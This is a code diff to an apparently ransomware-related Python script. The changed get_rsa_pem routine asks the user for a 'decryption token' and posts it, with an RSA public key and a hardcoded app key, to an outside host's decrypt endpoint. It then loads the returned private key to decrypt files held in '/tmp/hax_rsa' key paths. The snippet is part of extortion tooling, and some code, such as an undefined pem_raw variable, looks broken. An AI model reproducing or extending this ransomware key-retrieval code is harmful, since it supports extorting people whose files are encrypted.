@@ -66,7 +66,7 @@ def MyfileDecrypt(filepath, rsa_pem):
     
 def get_rsa_pem():
   password = '';
-  recoveryPassword = '';
+  recoveryPassword = raw_input("What is your decryption token? ");
     
   with open('/tmp/hax_rsa.pub', 'rb') as pub_file:
     pub = serialization.load_pem_public_key(
@@ -83,7 +83,7 @@ def get_rsa_pem():
     payload = {
       'pub': pub_raw,
       'app_key': '7mwpCrkxcTt53krZrg983sqCFuFjXktS',
-      'password': recoveryPassword
+      'decryptionToken': recoveryPassword
     }
     r = requests.post('https://378.julianjp.com/decrypt', data=payload)
     
@@ -93,25 +93,13 @@ def get_rsa_pem():
     derdata = base64.b64decode(b64data)
     pem = load_der_private_key(derdata, None, backend=default_backend())
     
-    return pem
     
     with open("/tmp/hax_rsa.pem", 'wb') as file:
       file.write(pem_raw)
       file.close()
-      with open("/tmp/hax_rsa.pem", 'rb') as pem_file:
-        print('hi', pem_file.read())
-        # pem = serialization.load_pem_private_key(
-        #   pem_file.read(),
-        #   '',
-        #   backend=default_backend()
-        # )
-        # pem_file.close()
-      
-        
-        # print(pem)
-        
+
+    return pem
     
-        # return pem
 
 pem = get_rsa_pem()
 
